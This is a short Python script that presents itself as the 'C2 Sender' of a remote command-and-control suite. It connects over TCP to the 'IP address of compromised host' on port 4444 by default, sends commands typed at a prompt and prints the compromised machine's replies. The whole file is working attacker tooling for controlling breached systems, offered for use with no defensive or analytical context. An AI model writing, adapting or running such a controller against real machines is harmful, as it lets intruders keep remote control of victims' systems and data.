import socket
import argparse

def main():
    # command line arguments
    parser = argparse.ArgumentParser(prog="C2 Sender", description="Sender for Remote Command and Control Suite" )
    parser.add_argument("address", help="IP address of compromised host")
    parser.add_argument("port", nargs="?", type=int, default=4444, help="Port to connect to (default: %(default)s)")
    args = parser.parse_args()

    # create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Connect to remote
    sock.connect((args.address, args.port))

    while True:
        message = input(">>> ")
        if message in ['quit', 'exit', 'q']:
            break

        sock.sendall(message.encode())
            
        response = sock.recv(4096)
        response = response.decode()
        print(response, end="")

if __name__ == "__main__":
    main()
